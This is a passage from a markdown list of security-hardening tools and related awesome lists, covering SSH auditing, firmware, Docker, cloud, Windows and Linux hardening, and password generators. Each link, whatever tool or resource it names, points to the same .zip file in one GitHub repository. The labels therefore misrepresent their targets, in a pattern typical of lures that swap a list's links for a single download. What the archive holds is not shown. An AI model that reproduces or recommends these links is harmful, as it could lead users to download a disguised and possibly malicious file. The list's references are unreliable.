- [ssh-audit](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - SSH server auditing (banner, key exchange, encryption, mac, compression, compatibility, security, etc)

### Hardware - CPU - BIOS - UEFI

- [CHIPSEC: Platform Security Assessment Framework](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - framework for analyzing the security of PC platforms including hardware, system firmware (BIOS/UEFI), and platform components
- [chipsec-check](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Tools to generate a Debian Linux distribution with chipsec to test hardware requirements

### Docker

- [Docker Bench for Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - script that checks for dozens of common best-practices around deploying Docker containers in production, inspired by the CIS Docker Community Edition Benchmark v1.1.0.

### Cloud

- [toniblyx/my-arsenal-of-aws-security-tools](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - List of open source tools for AWS security: defensive, offensive, auditing, DFIR, etc.

## Tools to apply security hardening

- [DevSec Hardening Framework](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - a framework to automate hardening of OS and applications, using Chef, Ansible and Puppet

### GNU/Linux

- [Linux Server Hardener](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - for Debian/Ubuntu (2019)
- [Bastille Linux](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - outdated

### Windows

- [Microsoft Security Compliance Toolkit 1.0](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - set of tools that allows enterprise security administrators to download, analyze, test, edit, and store Microsoft-recommended security configuration baselines for Windows and other Microsoft products
- [Hardentools](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - for Windows individual users (not corporate environments) at risk, who might want an extra level of security at the price of some usability.
- [Windows 10 Hardening](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A collective resource of settings modifications (mostly opt-outs) that attempt to make Windows 10 as private and as secure as possible.
- [Disassembler0 Windows 10 Initial Setup Script](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - PowerShell script for automation of routine tasks done after fresh installations of Windows 10 / Server 2016 / Server 2019
- [Automated-AD-Setup](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A PowerShell script that aims to have a fully configured domain built in under 10 minutes, but also apply security configuration and hardening
- [https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Script to perform some hardening of Windows 10

### TLS/SSL

- [Mozilla SSL Configuration Generator](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

### Cloud

- [toniblyx/my-arsenal-of-aws-security-tools](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - List of open source tools for AWS security: defensive, offensive, auditing, DFIR, etc.

## Password Generators

- [How-To Geek - 10 Ways to Generate a Random Password from the Linux Command Line](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Vitux - 8 Ways to Generate a Random Password on Linux Shell](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [SS64 - Password security and a comparison of Password Generators](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

# Books

# Other Awesome Lists

- [Awesome Cybersecurity Blue Team](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated collection of awesome resources, tools, and other shiny things for cybersecurity blue teams.

## Other Awesome Security Lists

(borrowed from [Awesome Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip))

- [Awesome Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A collection of awesome software, libraries, documents, books, resources and cools stuffs about security.
- [Android Security Awesome](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A collection of android security related resources.
- [Awesome CTF](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of CTF frameworks, libraries, resources and software.
- [Awesome Cyber Skills](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of hacking environments where you can train your cyber skills legally and safely.
- [Awesome Hacking](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of awesome Hacking tutorials, tools and resources.
- [Awesome Honeypots](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - An awesome list of honeypot resources.
- [Awesome Malware Analysis](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of awesome malware analysis tools and resources.
- [Awesome PCAP Tools](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A collection of tools developed by other researchers in the Computer Science area to process network traces.
- [Awesome Pentest](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A collection of awesome penetration testing resources, tools and other shiny things.
- [Awesome Linux Containers](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of awesome Linux Containers frameworks, libraries and software.
- [Awesome Incident Response](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of resources for incident response.
- [Awesome Web Hacking](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - This list is for anyone wishing to learn about web application security but do not have a starting point.
- [Awesome Threat Intelligence](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of threat intelligence resources.
- [Awesome Pentest Cheat Sheets](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Collection of the cheat sheets useful for pentesting
- [Awesome Industrial Control System Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of resources related to Industrial Control System (ICS) security.
- [Awesome YARA](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of awesome YARA rules, tools, and people.
- [Awesome Threat Detection and Hunting](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of awesome threat detection and hunting resources.
- [Awesome Container Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of awesome resources related to container building and runtime security
- [Awesome Crypto Papers](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A curated list of cryptography papers, articles, tutorials and howtos.

